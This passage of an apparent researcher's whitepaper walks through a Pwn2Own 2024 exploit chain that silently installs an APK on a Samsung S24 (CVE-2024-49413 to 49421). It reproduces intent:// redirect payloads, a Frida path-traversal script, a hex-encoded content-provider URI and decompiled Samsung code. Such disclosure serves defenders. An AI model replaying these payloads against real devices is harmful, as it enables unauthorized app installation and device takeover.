</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class a {
...
    public static boolean b(a a, Context context, Intent yayintentyay, boolean z, int i, Object obj) {
        ...
        return a.a(context, yayintentyay, z);
    }
    ...
    public final boolean a(Context context, Intent yayintentyay, boolean z) {
        ...
        try {
            context.startActivity(yayintentyay);
            return true;
        ...
    }
</code></pre></div></div>

<h4 id="bug-3--start-arbitrary-exported-activities">BUG 3 – Start Arbitrary Exported Activities</h4>

<p>If the web server sends a 302 Redirect HTTP code with a redirect URL starting with <code class="language-plaintext highlighter-rouge">intent://</code>, the WebView in Gaming Hub can be forced to start arbitrary activities.</p>

<p>In our exploit chain, the URL <code class="language-plaintext highlighter-rouge">https://us.mcsvc.samsung.com.maliciouserection.com?yayattackeryay=&lt;attackerServer&gt;</code> contains HTML code which runs JavaScript. This JavaScript forces the WebView to make a GET request to the attacker controlled server, defined by the GET parameter “<attackerServer>".</attackerServer></p>

<p>An attacker should run the previously mentioned Python script, which will host the web server at “<attackerServer>". This Python script simply returns a `302 Redirect HTTP` code, along with different URIs with `intent://` schemes.</attackerServer></p>

<p>For example, if a GET request is made to “http://<attackerServer>/yaylaunchshareliveyay", the Python script will return a 302 Redirect HTTP code with the following URI:</attackerServer></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>intent://#Intent;component=com.samsung.android.app.sharelive/.presentation.main.MainActivity;end;
</code></pre></div></div>

<p>When the Gaming Hub WebView receives this URI, it will:</p>

<ul>
  <li>Pass the URI to Android’s internal Intent parser</li>
  <li>Craft an Intent object based on the URI</li>
  <li>Run <code class="language-plaintext highlighter-rouge">startActivity(Intent)</code> against the Intent Object</li>
</ul>

<p>The rest of this exploit chain heavily relies on the ability to launch arbitrary exported Activities due to sending different 302 Redirect URIs.</p>

<h3 id="its-not-a-bug-its-a-feature--force-the-phone-to-download-arbitrary-files-from-a-nearby-phone">It’s not a bug, it’s a feature – Force the phone to download arbitrary files from a nearby phone</h3>

<h4 id="exploit-payload-2">Exploit Payload</h4>

<p>Two payloads are used for this feature, both of which are sent from the <attackerServer> web server. First, Gaming Hub will be forced to launch the Samsung Quick Share application:</attackerServer></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Intent;component=com.samsung.android.app.sharelive/.presentation.main.MainActivity
</code></pre></div></div>

<p>The second payload will force Gaming Hub to launch Samsung Quick Share and download an arbitrary file from a nearby attacker controlled device. Note that the nearby attacker controlled device should be sharing a file or folder via Samsung Quick Share’s QR Share feature. The <shareCode> value should be replaced via the value shown on the nearby attacker controlled device:</shareCode></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>intent://qr.quickshare.samsungcloud.com/&lt;shareCode&gt;#Intent;component=com.samsung.android.app.sharelive/com.samsung.android.app.sharelive.presentation.applink.QrCodeAppLinkActivity;scheme=https;end;
</code></pre></div></div>

<h4 id="not-an-exploit-details">Not an Exploit Details</h4>

<p>The application “Quick Share” (<code class="language-plaintext highlighter-rouge">com.samsung.android.app.sharelive</code> version 13.6.53.6) contains an exported Activity (<code class="language-plaintext highlighter-rouge">com.samsung.android.app.sharelive.presentation.applink.QrCodeAppLinkActivity</code>).</p>

<p><code class="language-plaintext highlighter-rouge">QrCodeAppLinkActivity</code> retrieves the incoming intent and checks the Data URI attached to the Intent object. The Data URI must start with one of the following values:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">https://qr.quickshare.samsungcloud.com/</code></li>
  <li><code class="language-plaintext highlighter-rouge">https://qr.stg-quickshare.samsungcloud.com/</code></li>
</ul>

<p>If the Data URI does not start with one of the above values, then the Activity finishes.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class QrCodeAppLinkActivity extends l {
...
    public final void onCreate(Bundle bundle) {
        ...
        String yaydatayay = getIntent().getDataString();
        List list = a.a; // list of valid URL values
        int i10 = 1;
        int i11 = 0;
        if (!(list instanceof Collection) || !list.isEmpty()) {
            Iterator it = list.iterator();
            while (it.hasNext()) {
                if (k.r0(yaydatayay, (String) it.next(), false)) { // checks if yaydatayay starts with one of the URL values
                    z10 = true;
                    break;
                }
            }
        }
        if (!z10) {
            ...
            finish();
            return;
        }
</code></pre></div></div>

<p>One thing to note about the URLs is that they are closely related to how Quick Share is used to share files between devices via QR Code.</p>

<p>When sharing a file via QR code, the sending device displays:</p>

<ul>
  <li>A QR code</li>
  <li>A URL that can be browsed to</li>
</ul>

<div align="center">
    <img src="/assets/images/blog/2025-05-13-pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper/pwn2own-ireland-2024-whitepaper-2.png" />
</div>

<p>In the above screenshot, the QR code contains the URL <code class="language-plaintext highlighter-rouge">https://qr.quickshare.smasungcloud.com/kvqpsbyNG5WW</code> which matches the URL requirements mentioned earlier. Additionally, the URL ends in a code that is also present in the URL that can be browsed to.</p>

<p>Using this information, it can be deduced that the URL that should be passed to <code class="language-plaintext highlighter-rouge">QrCodeAppLinkActivity</code> should be a QR code URL.</p>

<p>If the QR code is read by a Samsung phone, then the Samsung phone will automatically launch Quick Share and attempt connect to whatever device is hosting the file. From there, the Samsung phone will download the file automatically from the hosting device. Then the file will be saved to <code class="language-plaintext highlighter-rouge">/storage/emulated/0/Download/Quick Share/</code>.</p>

<h4 id="its-not-a-bug-its-a-feature--automatically-download-files-without-user-confirmation">Its not a bug, it’s a feature – Automatically download files without user confirmation</h4>

<p>If the Activity <code class="language-plaintext highlighter-rouge">QrCodeAppLinkActivity</code> is launched with an appropriate QR code URL, the Quick Share application will automatically attempt to connect to the hosting device and download the designated file. This is done without user confirmation.</p>

<p>It is understood that the Activity <code class="language-plaintext highlighter-rouge">QrCodeAppLinkActivity</code> must be exported in order to function properly. This is due to how phones read QR codes and craft Intent objects based on the content of the QR code.</p>

<p>Going back to the exploit chain, we will be using two payloads. First, the following payload forces Gaming Hub to simply launch Quick Share. This is to ensure that the appropriate services are running in the background before proceeding with the next step.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Intent;component=com.samsung.android.app.sharelive/.presentation.main.MainActivity
</code></pre></div></div>

<p>After Quick Share is launched, the <code class="language-plaintext highlighter-rouge">MainActivity</code> of Quick Share is kept in the foreground while the Gaming Hub WebView is kept in the background. The WebView still processes JavaScript and data while running in the background.</p>

<p>After a few seconds, the Gaming Hub WebView receives another payload, which forces the device to perform the following actions:</p>

<ul>
  <li>Quick Share’s <code class="language-plaintext highlighter-rouge">QRCodeAppLinkActivity</code> Activity is launched
    <ul>
      <li>A QR code URL is passed to the Activity</li>
    </ul>
  </li>
  <li>The QR code value is read from the URL</li>
  <li>The phone will recognize that it must attempt to download a file from a nearby phone</li>
  <li>The phone will attempt to connect to the nearby phone and download the file automatically</li>
  <li>The file is placed in <code class="language-plaintext highlighter-rouge">/storage/emulated/0/Download/Quick Share/</code></li>
</ul>

<p>=====================================================================================</p>

<p>NOTE: typically on Android, an Activity must be in the foreground before it can launch Activities. However, if an application has the correct Android permissions, it will have the ability to launch Activities even if the running application is in the background.</p>

<p>In this case, Gaming Hub does contain those permissions. So while Gaming Hub is in the background and Quick Share’s Main Activity is in the foreground, Gaming Hub is still able to launch Activities.</p>

<p>Specifically, when Gaming Hub is launched, it starts a service in the foreground of the device, and its able to keep that permission via the <code class="language-plaintext highlighter-rouge">android.permission.FOREGROUND_SERVICE</code> Android permission.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;manifest xmlns:android="http://schemas.android.com/apk/res/android"
    android:versionCode="710107000"
    android:versionName="7.1.01.7"
    android:compileSdkVersion="35"
    android:compileSdkVersionCodename="15"
    package="com.samsung.android.game.gamehome"
    ...    
    &lt;uses-permission android:name="android.permission.FOREGROUND_SERVICE"/&gt;
</code></pre></div></div>

<p>So as long as the service continues to run in the foreground, then Gaming Hub can continue to launch Activities even if none of its own Activities are in the foreground.</p>

<h3 id="bug-4--a-file-downloaded-via-quick-share-can-be-saved-to-an-arbitrary-location">Bug 4 – A file downloaded via Quick Share can be saved to an arbitrary location</h3>

<h4 id="exploit-payload-3">Exploit Payload</h4>

<p>A Frida script (or Xposed Module) can be used to exploit this issue. Run the following Frida Script on an attacker controlled phone:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>console.log("script loaded");
Java.perform(function() {

    var yayclass1yay = Java.use('e2.t');

    yayclass1yay.n.overload('org.json.JSONObject', 'e2.h', 'boolean').implementation = function(a,b,c) {

        if (a.has("IsPrivateShare")) {
            a.put("IsPrivateShare", true)
        }
        if (a.has("Path")) {
            a.put("Path","/../../../../../../GPUWatch_Dump/html/")
        }
        var ret_val = this.n(a,b,c);
        console.log("send json: " + a + "\n" + "send bytes: " + ret_val + "\n")
        return ret_val;
    }
});
</code></pre></div></div>

<p>The attacker controlled phone should then share a file on their phone via Quick Share. Take note of the QR code URL that is generated on the attacker controlled phone generate. That QR code URL should then be used to launch Quick Share on the target phone.</p>

<p>NOTE: the <code class="language-plaintext highlighter-rouge">GPUWatch_Dump/html/</code> value in the above script is strictly used for this exploit chain.</p>

<h4 id="exploit-details-2">Exploit Details</h4>

<p>The application “Quick Share Agent” (<code class="language-plaintext highlighter-rouge">com.samsung.android.aware.service</code> version 3.5.19.33) is a background application that runs alongside the Quick Share application. When sending and receiving files via Quick Share, it is actually Quick Share Agent that handles connections to remote phones and sending/receiving files.</p>

<p>In Quick Share Agent, the class <code class="language-plaintext highlighter-rouge">e2.t</code> handles:</p>

<ul>
  <li>Managing a Socket connection between phones</li>
  <li>Sending data to the remote device</li>
  <li>Receiving data from the remote device</li>
</ul>

<p>When sending a file, two JSON messages are sent before sending the file(s). The first message establishes information about the connection, and two fields are of interest for this exploit chain:</p>

<ul>
  <li>What type of data is being sent (File/Folder)</li>
  <li>If the transfer is considered a “PrivateShare”, which is a Samsung exclusive function to encrypt the file being sent</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
  "TotalBytes": 3322214,
  "TotalCount": 1,
  "ItemType": "File",
  "IsAlbumShare": true,
  "IsPrivateShare": false,
  "SenderFriendlyName": "YayAttackerPhoneYay",
  "TransportDescription": "",
  ...
</code></pre></div></div>

<p>The second message contains information about the file/folder being sent. Two fields are of interest for this exploit chain:</p>

<ul>
  <li>Name</li>
  <li>Path</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
  "Name": "Yay.jpg",
  "TotalBytes": 3322214,
  "Path":"\/storage\/emulated\/0\/ShareViaWifi\/Yay.jpg",
  "Url": "ftcp_url_0_",
  ...
</code></pre></div></div>

<p>When the second message is received, Quick Share Agent passes the received JSON string to class <code class="language-plaintext highlighter-rouge">f2.i</code> method <code class="language-plaintext highlighter-rouge">s(JSONObject)</code>. From there, Name and Path are passed to two different sanitization functions, depending on if class <code class="language-plaintext highlighter-rouge">x1.b</code> method <code class="language-plaintext highlighter-rouge">x()</code> returns <code class="language-plaintext highlighter-rouge">True</code> or <code class="language-plaintext highlighter-rouge">False</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class i implements k.c, c.c {
    public final b b;
...
    public final f2.l s(JSONObject yayreceivedjsonyay) {
        ...
        String yaynameyay;
        String yaypathyay;
        if(this.b.x()) {
            // no sanitization
            yaynameyay = yayreceivedjsonyay.optString("Name", "Unknown.dat");
            yaypathyay = yayreceivedjsonyay.optString("Path");
        }
        else {
            // sanitize Name and Path
            String yaytemp1yay = yayreceivedjsonyay.optString("Name", "Unknown.dat");
            yaynameyay = new k5.i("[:\"&lt;&gt;*?|/\u0000-\u001F\u007F\\\\]").e (yaytemp1yay, "-"); // sanitizes name
            String yaytemp2yay = yayreceivedjsonyay.optString("Path");
            yaypathyay = new k5.i("[:\"&lt;&gt;*?|\u0000-\u001F\u007F\\\\]").e(yaytemp2yay, "-");
        }
</code></pre></div></div>

<p>Looking at class <code class="language-plaintext highlighter-rouge">x1.b</code> method <code class="language-plaintext highlighter-rouge">x()</code>, the return value was dependent on the value of the static Boolean value <code class="language-plaintext highlighter-rouge">h</code>. And the value of <code class="language-plaintext highlighter-rouge">h</code> is dependent on whatever executes the method <code class="language-plaintext highlighter-rouge">J(boolean)</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public class b {
    public boolean h;
    ...
    public final void J(boolean z5) {
        this.h = z5;
    }
    ...
    public final boolean x() {
        return this.h;
    }
</code></pre></div></div>

<p>Previously, it was mentioned that 2 JSON messages are sent to the receiving phone. The first message is processed in class <code class="language-plaintext highlighter-rouge">f2.i</code> method <code class="language-plaintext highlighter-rouge">D(c, JSONObject)</code>. In one part of that method, the value related to the key <code class="language-plaintext highlighter-rouge">IsPrivateShare</code> is extracted and then is passed as an argument to class <code class="language-plaintext highlighter-rouge">x1.b</code> method <code class="language-plaintext highlighter-rouge">J(boolean)</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class i implements k.c, c.c {
...
    public final boolean D(c c, JSONObject yayjsonobjectyay) {
        ...
        this.g.J(yayjsonobjectyay.optBoolean("IsPrivateShare", false));
</code></pre></div></div>

<h4 id="bug-4--isprivateshare-is-attacker-controlled-resulting-in-a-path-traversal-attack">BUG 4 – IsPrivateShare is attacker controlled, resulting in a Path Traversal attack</h4>

<p>When receiving a file/folder from an attacker controlled phone, and the attacker controlled phone sends a IsPrivateShare value of True, then the attacker controlled phone can force the target phone to save the incoming file into any directory that Quick Share Agent has write access to.</p>

<p>In our exploit chain, we use this vulnerability to save a Drozer .apk file onto the victim’s phone at the location <code class="language-plaintext highlighter-rouge">/storage/emulated/0/GPUWatch_Dump/html/</code>. In order to do this, first run the following Frida command. Note that you might have to share a file normally first in order to start the Quick Share Agent service:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ frida -U -l yayscriptyay.js com.samsung.android.aware.service
</code></pre></div></div>
<p>Below is the contents of yayscriptyay.js. This script will:</p>

<ul>
  <li>Intercept all JSON messages that are intended to be sent to the receiving phone</li>
  <li>Change the IsPrivateShare value to True</li>
  <li>Change the Path value to <code class="language-plaintext highlighter-rouge">/../../../../../../GPUWatch_Dump/html/</code></li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>console.log("script loaded");
Java.perform(function() {

    var yayclass1yay = Java.use('e2.t');

    yayclass1yay.n.overload('org.json.JSONObject', 'e2.h', 'boolean').implementation = function(a,b,c) {

        if (a.has("IsPrivateShare")) {
            a.put("IsPrivateShare", true)
        }
        if (a.has("Path")) {
            a.put("Path","/../../../../../../GPUWatch_Dump/html/")
        }
        var ret_val = this.n(a,b,c);
        console.log("send json: " + a + "\n" + "send bytes: " + ret_val + "\n")
        return ret_val;
    }
});
</code></pre></div></div>

<p>NOTE: the number of “../” in the new Path value matters. When Quick Share “downloads a folder” from a phone, it actually performs the following steps:</p>

<ol>
  <li>Creates a new directory <code class="language-plaintext highlighter-rouge">/storage/emulated/0/Android/data/com.samsung.android.aware.service/files/&lt;session_id&gt;/</code></li>
  <li>The folder(s) defined in the Path value are created in the above mentioned directory</li>
  <li>The file(s) that are in the sender’s phone are sent to the receiving phone, and saved in the above newly created directory</li>
  <li>Once all files are sent, the above newly created directory is copied to <code class="language-plaintext highlighter-rouge">/storage/emulated/0/Download/Quick Share/</code></li>
</ol>

<p>The number of “../” ensures that during the folder creation process (step 2), the folder(s) are created in the <code class="language-plaintext highlighter-rouge">/storage/emulated/0/</code> directory.</p>

<p>Once the Frida script is running, place the .apk file into any directory on the attacker controlled phone. Then share the folder and select “Quick Share”. Finally, generate a QR code for the share by tapping “QR code or link”.</p>

<div align="center">
    <img src="/assets/images/blog/2025-05-13-pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper/pwn2own-ireland-2024-whitepaper-3.png" />
</div>

<p>Now when someone tries to download the folder, yay.apk will be placed in <code class="language-plaintext highlighter-rouge">/storage/emulated/0/GPUWatch_Dump/html/</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>e1s:/storage/emulated/0 # ls ./GPUWatch_Dump/html/
yay.apk
</code></pre></div></div>

<div align="center">
    <img src="/assets/images/blog/2025-05-13-pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper/pwn2own-ireland-2024-whitepaper-4.png" />
</div>

<p>For our exploit chain, when the attacker phone generates a QR code, the random code at the end of the URL should be used in bug 4. This will force the target phone to download the .apk file automatically without user confirmation.</p>

<h3 id="bug-5--silently-install-apk-file-located-on-disk">Bug 5 – Silently install .apk file located on disk</h3>

<h4 id="exploit-code-1">Exploit Code</h4>

<p>The following payload is sent from <attackerServer> to force Gaming Hub to launch Smart Switch Agent:</attackerServer></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>intent://#Intent;component=com.sec.android.easyMover.Agent/.ui.SsmUpdateCheckActivity;action=com.sec.android.easyMover.Agent.WATCH_INSTALL_SMART_SWITCH;S.MODE=DIALOG;S.ssm_action=yayactionyay;S.ssm_uri=%63%6f%6e%74%65%6e%74%3a%2f%2f%63%6f%6d%2e%73%61%6d%73%75%6e%67%2e%67%70%75%77%61%74%63%68%61%70%70%2e%48%74%6d%6c%44%75%6d%70%50%72%6f%76%69%64%65%72%2f%79%61%79%2e%61%70%6b;end;
</code></pre></div></div>

<p>NOTE: the <code class="language-plaintext highlighter-rouge">ssm_uri</code> value is set to a custom value that is specific to this exploit chain.</p>

<h4 id="exploit-details-3">Exploit Details</h4>

<p>The application “Smart Switch Agent” (<code class="language-plaintext highlighter-rouge">com.sec.android.easyMover.Agent</code> version 2.0.02.24) is a background application that runs alongside the Smart Switch application. When transferring data between an old phone and a new Samsung phone, the Smart Switch Agent helps facilitate the installation of applications on the new phone.</p>

<p>One of the exported Activities, <code class="language-plaintext highlighter-rouge">com.sec.android.easyMover.Agent.ui.SsmUpdateCheckActivity</code>, is protected by a custom permission, com.wssnps.permission.COM_WSSNPS. However, Gaming Hub also uses this permission, making it possible for Gaming Hub to launch the <code class="language-plaintext highlighter-rouge">SsmUpdateCheckActivity</code> Activity.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;manifest xmlns:android="http://schemas.android.com/apk/res/android"
    android:versionCode="710107000"
    android:versionName="7.1.01.7"
    ...
    package="com.samsung.android.game.gamehome"
    ...
    &lt;uses-permission android:name="com.wssnps.permission.COM_WSSNPS"/&gt;
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;manifest xmlns:android="http://schemas.android.com/apk/res/android"
    android:versionCode="200200024"
    android:versionName="2.0.02.24"
    ...
    package="com.sec.android.easyMover.Agent"
    ...
    &lt;activity android:name="com.sec.android.easyMover.Agent.ui.SsmUpdateCheckActivity"
            android:permission="com.wssnps.permission.COM_WSSNPS"
            android:exported="true"
            android:excludeFromRecents="true"
            android:screenOrientation="portrait"
            android:configChanges="smallestScreenSize|screenSize|screenLayout|orientation"&gt;
            &lt;intent-filter&gt;
                &lt;action android:name="com.sec.android.easyMover.Agent.WATCH_INSTALL_SMART_SWITCH"/&gt;
                &lt;category android:name="android.intent.category.DEFAULT"/&gt;
            &lt;/intent-filter&gt;
        &lt;/activity&gt;
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">SsmUpdateCheckActivity</code> first checks that the incoming Intent contains a specific Action, and assigns the Intent String extra “MODE” to the static String variable <code class="language-plaintext highlighter-rouge">r</code>. If the Action value does not match a specific value, then the Activity finishes.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public class SsmUpdateCheckActivity extends p {
    ...
    public final void onCreate(Bundle bundle) {
        ...
        Intent intent = getIntent();
        if (intent == null) {
            finish();
        } else {
            this.q = intent.getAction();
            this.r = intent.getStringExtra("MODE");
            if (!"com.sec.android.easyMover.Agent.WATCH_INSTALL_SMART_SWITCH".equals(this.q)) {
                Log.w("[SmartSwitchAgent]SsmUpdateCheckActivity", "Undefined action! - " + this.q);
                finish();
    ...
</code></pre></div></div>

<p>Continuing down <code class="language-plaintext highlighter-rouge">SsmUpdateCheckActivity</code>, a new Intent object is created and the target Component value is dependent on the value of the String extra “MODE”. For our exploit chain, our “MODE” value is set to “DIALOG”, which will set the Intent object’s Component to <code class="language-plaintext highlighter-rouge">com.sec.android.easyMover.Agent.ui.SsmUpdatePkgDialog</code>.</p>

<p>All of the incoming Intent’s extras are added to the newly created Intent object. Then <code class="language-plaintext highlighter-rouge">startActivity(Intent)</code> is executed against the newly created Intent object.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public class SsmUpdateCheckActivity extends p {
    ...
    public final void onResume() {
        ...
        if ("DIALOG".equals(this.r)) {
            Intent yayintentyay = new Intent(this.o, (Class&lt;?&gt;) SsmUpdatePkgDialog.class);
            yayintentyay.setAction(getIntent().getAction());
            yayintentyay.replaceExtras(getIntent());
            yayintentyay.addFlags(33554432);
            startActivity(yayintentyay);
            finish();
            return;
        }
</code></pre></div></div>

<p>When <code class="language-plaintext highlighter-rouge">SsmUpdatePkgDialog</code> receives the Intent object, it passes the object to class <code class="language-plaintext highlighter-rouge">s4.c</code> and sets some static variables based on the Intent object’s extras. Two of these parameters are of interest:</p>

<p>•	<code class="language-plaintext highlighter-rouge">ssm_action</code> which is saved to the static variable <code class="language-plaintext highlighter-rouge">j</code>
•	<code class="language-plaintext highlighter-rouge">ssm_uri</code> which is saved to the static variable <code class="language-plaintext highlighter-rouge">k</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public class SsmUpdatePkgDialog extends n {
...
    public final void onCreate(Bundle bundle0) {
        ...
        this.q = new c(this.getIntent());
        ...
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class c {
...
    public c(Intent intent) {
        ...
        this.j = intent.getStringExtra("ssm_action");
        this.k = intent.getStringExtra("ssm_uri");
        ...
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">ssm_uri</code> value / static <code class="language-plaintext highlighter-rouge">k</code> variable is then read by class <code class="language-plaintext highlighter-rouge">l.n3</code> method <code class="language-plaintext highlighter-rouge">run()</code> and passes the value to class <code class="language-plaintext highlighter-rouge">l4.u</code> method <code class="language-plaintext highlighter-rouge">g(String, String)</code>. From there, the value is passed to class <code class="language-plaintext highlighter-rouge">s4.a</code> method <code class="language-plaintext highlighter-rouge">k(Context, String, String, b)</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class n3 implements Runnable {
...
    public final void run() {
    ...
        case 7:
                SsmUpdatePkgActivity ssmUpdatePkgActivity = (SsmUpdatePkgActivity) obj;
                ...
                StringBuilder sb = new StringBuilder();
                sb.append(ssmUpdatePkgActivity.o.getFilesDir());
                ssmUpdatePkgActivity.p.g(o2.e(sb, File.separator, "SmartSwitchMobile.apk"), ssmUpdatePkgActivity.q.k);
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class u {
...
    public final void g(String yaydestinationyay, String yayssmuriyay) {
    ...
        if (!a.k(this.m, yaydestinationyay, yayssmuriyay, new b(this))) {
        ...
</code></pre></div></div>

<p>In class <code class="language-plaintext highlighter-rouge">s4.a</code> method <code class="language-plaintext highlighter-rouge">k(Context, String, String, b)</code>, the Easy Mover Agent application will try to reach out to the URI defined by <code class="language-plaintext highlighter-rouge">ssm_uri</code> via <code class="language-plaintext highlighter-rouge">context.getContentResolver().openInputStream(Uri)</code>. If the open is successful, then Easy Mover Agent will attempt to download/copy the file to Easy Mover Agent’s internal files directory as the file “SmartSwitchMobile.apk”.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public abstract class a {
...
    public static boolean k(Context context0, String yaydestinationyay, String yayssmuriyay, b b0) {
        ...
        InputStream inputStream0;
        ...
        Uri yayuriyay = Uri.parse(yayssmuriyay);
        ...
        try {
            bufferedInputStream0 = null;
            inputStream0 = context0.getContentResolver().openInputStream(yayuriyay);
        }
        ...
        
</code></pre></div></div>

<p>After the file is downloaded and saved as “SmartSwitchMobile.apk”, Easy Mover Agent will automatically attempt to install the saved .apk file.</p>

<div align="center">
    <img src="/assets/images/blog/2025-05-13-pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper/pwn2own-ireland-2024-whitepaper-5.png" />
</div>

<p>After the application is installed, Easy Mover Agent will create a new Intent object with an Action value set by <code class="language-plaintext highlighter-rouge">ssm_action</code> / static variable <code class="language-plaintext highlighter-rouge">j</code>. Easy Mover Agent will then run <code class="language-plaintext highlighter-rouge">startActivity(Intent)</code> against this Intent object.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public final class c {
...
    public final Intent a(Context context) {
        ...
        String yayactionyay = this.j;
        return TextUtils.isEmpty(yayactionyay) ? context.getPackageManager().getLaunchIntentForPackage("com.sec.android.easyMover") : new Intent(yayactionyay);
    }
</code></pre></div></div>

<h4 id="bug-5--easy-mover-agent-does-not-check-the-validity-of-smartswitchmobileapk-before-installing-the-apk-file">BUG 5 – Easy Mover Agent does not check the validity of “SmartSwitchMobile.apk” before installing the .apk file</h4>

<p>Based on the name of the saved file, it can be deduced that the application expects a specific application developed by Samsung. If so, then the application should be checking if the .apk file is signed by Samsung’s certificate. Without this check, it is possible to force Easy Mover Agent to install any .apk file saved to the Android device.</p>

<p>At this point in our exploit chain, the Drozer .apk file should be downloaded to <code class="language-plaintext highlighter-rouge">/storage/emulated/0/GPUWatch_Dump/html/</code>. However, Easy Mover Agent does not have access to the <code class="language-plaintext highlighter-rouge">/storage/emulated/0</code> directory since it lacks the proper Android permissions.</p>

<p>However, the application GPUWatch (<code class="language-plaintext highlighter-rouge">com.samsung.gpuwatchapp version</code> 2.1.2) contains an exported Content Provider that allows applications to download files from the directory <code class="language-plaintext highlighter-rouge">/storage/emulated/0/GPUWatch_Dump/html/</code>.</p>

<p>So to force Easy Mover Agent to install the Drozer .apk file, the URI passed to <code class="language-plaintext highlighter-rouge">SsmUpdateCheckActivity</code> must be set to GPUWatch’s Content Provider.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssm_uri=%63%6f%6e%74%65%6e%74%3a%2f%2f%63%6f%6d%2e%73%61%6d%73%75%6e%67%2e%67%70%75%77%61%74%63%68%61%70%70%2e%48%74%6d%6c%44%75%6d%70%50%72%6f%76%69%64%65%72%2f%79%61%79%2e%61%70%6b

Decoded:

ssm_uri=content://com.samsung.gpuwatchapp.HtmlDumpProvider/yay.apk
</code></pre></div></div>

<p>After Drozer is launched, Drozer can be launched via one of the following methods:</p>

<ul>
  <li>Set <code class="language-plaintext highlighter-rouge">ssm_action</code> to an Action value that is registered by Drozer
    <ul>
      <li>For our exploit chain, we will not be using this method since Drozer does not register a unique Action value</li>
      <li>Creating a new Drozer .apk requires Google Play to scan the app before it can be installed on the Samsung device</li>
      <li>I’m writing this whitepaper 4 days before the Pwn2Own entry is due, and I don’t want to risk pissing off Google Play</li>
    </ul>
  </li>
  <li>Use Gaming Hub to launch Drozer via new Intent
    <ul>
      <li>This is the method we use in our exploit chain</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><summary type="html"><![CDATA[Description The Samsung S24 contains several bugs which, when chained together, can result in rogue applications being installed on the device. At a high level, the chain consists of: Tapping a malicious hyperlink on an attacker controlled website The application “Gaming Hub” (com.samsung.android.game.gamehome version 7.1.01.7 or below) is launched and a WebView is loaded to the website https://us.mcsvc.samsung.com.maliciouserection.com BUG 1 (CVE-2024-49419) – “Gaming Hub” does not perform a check against the URL before loading the URL in a WebView BUG 2 (CVE-2024-49418) – “Gaming Hub” does perform a check against the URL before enabling / disabling JavaScript in a WebView, but this check is insufficient This check only enables / disables JavaScript in the WebView If this check fails, the URL will still load in the WebView “Gaming Hub” can be forced to start arbitrary Android exported Activities BUG 3 (CVE-2024-49420) – The “start Activity” code is executed when it receives data from the WebView in BUG 1 This code can be executed whether JavaScript is enabled / disabled With the ability to launch arbitrary exported Activities, the application “Quick Share” (com.samsung.android.app.sharelive version 13.6.53.6) is launched and forced to download an arbitrary file from a nearby attacker controlled Samsung phone In this chain, the attacker’s phone will send an attacker created .apk file The attacker controlled Samsung phone sends a custom message to the target phone to save the sent file to an arbitrary location on the target phone BUG 4 (CVE-2024-49421) – The application “Quick Share Agent” (com.samsung.android.aware.service version 3.5.19.33) contains a path traversal issue if the attacker’s phone sends a custom crafted message while transferring the target file The application “Gaming Hub” contains permissions which give it the ability to launch applications while in the background; using this, the application “Smart Switch Agent” (com.sec.android.easyMover.Agent version 2.0.02.24) is launched When “Smart Switch Agent” is launched, it will try to either open a designated file or download a designated Content Provider to download a file The Activity that gets launched is exported, but is protected by a permission However, “Gaming Hub” has this permission, which lets “Gaming Hub” launch the specific Activity The Content Provider that is specified has access to the same area where the previously downloaded .apk is stored So in this case, “Smart Switch Agent” is forced to download the previously downloaded .apk file “Smart Switch Agent” then attempts to automatically install whatever file was downloaded BUG 5 (CVE-2024-49413) – There are no sanity checks to determine where the downloaded file came from, nor if the application is supposed to be installed “Smart Switch Agent” does not check if the downloaded .apk file was signed by Samsung before installation Finally, “Gaming Hub” launches the package that was installed by “Smart Switch Agent” Exploit Code The exploit chain affects the 